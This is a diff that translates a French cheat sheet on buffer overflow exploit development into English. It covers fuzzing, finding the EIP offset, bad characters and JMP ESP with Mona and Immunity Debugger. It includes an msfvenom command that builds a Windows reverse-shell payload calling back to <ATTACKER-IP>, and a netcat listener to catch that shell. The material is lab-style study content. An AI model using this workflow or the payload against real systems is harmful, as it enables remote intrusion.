@@ -1,57 +1,57 @@
 # Mona with Immunity Debugger
 
-- Fuzzer le binaire pour trouver le nombre caractere qui fait planter le programme.
+- Fuzz the binary to find the number of characters that crash the program.
 
-Demarrer le serveur (Running) dans immunity et crée un nouveau workspace:
+Start the server (Running) in immunity and create a new workspace:
 
 ```sh
 !mona config -set workingfolder c:\mona\%p
 ```
 
-Créer un pattern avec metasploit pour trouver l'offset d'EIP
+Create a pattern with metasploit to find the EIP offset
 
 ```sh
 msf-pattern_create -l 2400 
-# 2400 (qui le resultat du script fuzzing.py)
+# 2400 (which is the result from fuzzing.py script)
 ```
 
-Retrouve l'offset exacte d'EIP au moment du crash
+Find the exact EIP offset at the time of crash
 
 ```sh
 !mona findmsp -distance 2400
-# ou 
+# or 
 msf-pattern_offset -q EIP_ADDRESS
 ```
 
-Remarrer le serveur (Running) dans immunity et recherche les badchars, on créer un tableau de badchars avec mona
+Restart the server (Running) in immunity and search for badchars, we create a badchars array with mona
 
 ```sh
 !mona bytearray -b "\x00"
 ```
 
-On génère une chaîne de badchars qu'on ajoute en tant que payload dans le script d'exploit ET on l'execute.
+We generate a badchars string that we add as a payload in the exploit script AND we execute it.
 
-On compare les badchars avec l'offset d'ESP au moment du crash pour retourver les badchars
+We compare the badchars with the ESP offset at the time of crash to find the badchars
 
 ```sh
 !mona compare -f C:\mona\<workingfolder>\bytearray.bin -a <ESP offset>
 ```
 
-On génére un shellcode avec metasploit excluant les badchars
+We generate a shellcode with metasploit excluding the badchars
 
 ```sh
 msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -b "<badchars>" -f py
 ```
 
-Remarrer le serveur (Running) dans immunity et trouver un offset de jump sur ESP avec mona pour exécuter le shellcode.
+Restart the server (Running) in immunity and find a jump offset on ESP with mona to execute the shellcode.
 
 ```sh
 !mona jmp -r esp -cpb "<badchars>"
 ```
 
-On met à jour l'offset du retn dans le script d'exploit et on ajoute des NOPS (16 c'est pas mal)
+We update the retn offset in the exploit script and add NOPS (16 is good)
 
-On démarre un netcat en local et on exploite
+We start a netcat locally and exploit
 
 ```sh
 rlwrap nc -nlvp 4444
